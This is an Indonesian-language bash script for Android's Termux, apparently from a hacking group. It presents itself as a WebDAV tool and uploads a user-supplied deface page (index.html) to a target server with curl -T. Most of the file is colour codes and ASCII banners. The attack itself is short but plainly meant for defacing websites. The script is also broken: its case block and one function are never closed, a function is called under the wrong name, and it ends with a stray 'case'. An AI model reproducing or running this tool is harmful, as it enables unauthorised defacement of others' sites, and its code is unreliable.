# Webdav Version 1.0.1
# Hayoo Mau Ngapain?
# Pasti Mau Recode ea
#colors
blue='\e[1;34m'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
grey="\033[0;37m"
purple="\033[0;35m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
mon="mon"
lightcyan='\e[96m'
white='\e[1;37m'
nc="\e[0m"
red='\e[1;31m'
yellow='\e[1;33m'
clear
#menu
function menu(){
    echo -e $Fiuscha "Selamat menggunakan Tools Ini >_<"
    sleep 0.25
    echo -e $purple "Silahkan Pilih Daftar List Nya"
    sleep 0.25
    echo -e $green "[1.Webdav] $blue [2.Web Vuln Webdav]"
    echo -e $red "[3.exit]"
    read TOD 
    case $TOD in 
    ("1")
    sleep 1
    Webdav
    ("2")
    sleep 1
    webvuln
    ("3")
    echo -e "Thanks you mathefakah "
}
function Webdav(){
    echo -e "NOTE: Letakan Script Deface Di Luar Folder"
    sleep 0.25
    echo -e "Masukkan Target Webdav"
    sleep 0.25
    read "[root@target]>" target
    echo "menunggu..."
    sleep 1
    echo -e "NOTE: File Harus Bernama index.html"
    echo -e "Masukan Script Deface/file"
    read "[root@file]>" file
    sleep 1
    clear
    echo -e "Menghubungkan..."
 curl -T /storage/emulated/0/index.html $target
}
function mulai (){
    echo "Melanjutkan Untuk Memilih"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            menu
    else
            echo "Bye Script Kiddies..."
    fi
#install
function Install(){
    pkg install ruby
    gem install lolcat
    pkg install curl
    echo -e $blue "selamat Tools Terinstal"
}
#Banner
function Banner(){
     sleep 0.25                          
 echo -e $red " _ _ _     _     _"         
 echo -e $red "| | | |___| |_ _| |___ _ _" 
 echo -e $red "| | | | -_| . | . | .'| | |"
 echo -e $red "|_____|___|___|___|__,|\_/ "
            clear
            sleep 0.25
 echo -e $blue " _ _ _     _     _"         
 echo -e $blue "| | | |___| |_ _| |___ _ _" 
 echo -e $blue "| | | | -_| . | . | .'| | |"
 echo -e $blue "|_____|___|___|___|__,|\_/ "
            clear
            sleep 0.25
 echo -e $green " _ _ _     _     _"         
 echo -e $green "| | | |___| |_ _| |___ _ _" 
 echo -e $green "| | | | -_| . | . | .'| | |"
 echo -e $green "|_____|___|___|___|__,|\_/ "
            clear
            sleep 0.25
 echo -e $red " _ _ _     _     _"         
 echo -e $red "| | | |___| |_ _| |___ _ _" 
 echo -e $red "| | | | -_| . | . | .'| | |"
 echo -e $red "|_____|___|___|___|__,|\_/ "
            clear
            sleep 0.25
 echo -e $blue " _ _ _     _     _"         
 echo -e $blue "| | | |___| |_ _| |___ _ _" 
 echo -e $blue "| | | | -_| . | . | .'| | |"
 echo -e $blue "|_____|___|___|___|__,|\_/ "
            clear
            sleep 0.25
 echo -e $green " _ _ _     _     _"         
 echo -e $green "| | | |___| |_ _| |___ _ _" 
 echo -e $green "| | | | -_| . | . | .'| | |"
 echo -e $green "|_____|___|___|___|__,|\_/ "
            clear
            sleep 0.25
 echo -e $red " _ _ _     _     _"         
 echo -e $red "| | | |___| |_ _| |___ _ _" 
 echo -e $red "| | | | -_| . | . | .'| | |"
 echo -e $red "|_____|___|___|___|__,|\_/ "
            clear
            sleep 0.25   
            echo -e " _       __     __        __           " | lolcat
            sleep 0.21
            echo -e "| |     / /__  / /_  ____/ /___ __   __" | lolcat
            sleep 0.22
            echo -e "| | /| / / _ \/ __ \/ __  / __ \/ | / /" | lolcat
            sleep 0.23
            echo -e "| |/ |/ /  __/ /_/ / /_/ / /_/ /| |/ /" | lolcat
            sleep 0.24
            echo -e "|__/|__/\___/_.___/\__,_/\__,_/ |___/ " | lolcat
            sleep 0.25
}
install
clear
Banner
echo ""
echo -e $red "|<=+++++++++++++++=+++++++++++++++=>|"
sleep 1
echo -e $blue "+_+                       $purple +_+"
sleep 0.21
echo -e $red "+ AUTHOR : Hadi Prasetia            +"
sleep 0.21 
echo -e $blue "+_+                       $purple +_+"
sleep 0.21
echo -e $red "+ KONTAK : tampanskyyt@gmail.com    +"
sleep 0.21
echo -e $blue "+_+                       $purple +_+"
sleep 0.21
echo -e $red "+ Team : Red Eye Cyber Team         +"
sleep 0.21
echo -e $blue "+_+                       $purple +_+"
sleep 0.21
echo -e $red "+ SUPPORT By Assyfamawarni          +"
sleep 0.21
echo -e $blue "+_+                       $purple +_+"
sleep 0.25
echo -e $red "|<=+++++++++++++++=+++++++++++++++=>|"
sleep 1
mulai
case
